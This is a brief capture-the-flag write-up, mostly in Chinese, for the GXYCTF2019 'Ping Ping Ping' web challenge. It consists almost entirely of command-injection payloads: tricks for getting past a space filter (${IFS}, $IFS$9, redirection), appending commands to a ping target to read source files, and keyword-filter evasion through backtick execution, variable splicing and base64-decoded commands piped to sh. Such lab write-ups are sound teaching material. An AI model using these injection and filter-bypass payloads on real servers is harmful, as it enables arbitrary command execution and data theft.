---
title: GXYCTF2019-Ping Ping Ping
category: CTF-Web
date: 2024-2-11
---

> source:[https://www.nssctf.cn/problem/1096](https://www.nssctf.cn/problem/1096)

## EXP

- 绕过空格

```cpp
{cat,flag.txt} 

cat${IFS}flag.txt

cat$IFS$9flag.txt
  
cat$IFS$1flag.txt

cat<flag.txt

%09替换

cat<>flag.txt
  
kg=$'\x20flag.txt'&&cat$kg
```

- 读取源码

```cpp
127.0.0.1;cat$IFS$1index.php
```

- 绕过flag

```cpp
内联执行
payload=127.0.0.1;cat$IFS$1`ls`

变量拼接
payload=127.0.0.1;a=ag;cat$IFS$1fl$a.php

base64编码
payload=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

- 补充

```cpp
引号斜线绕过
fla\g
fla"g

$1 $2 $@绕过
fla$@g fla$1g fla$2g
```

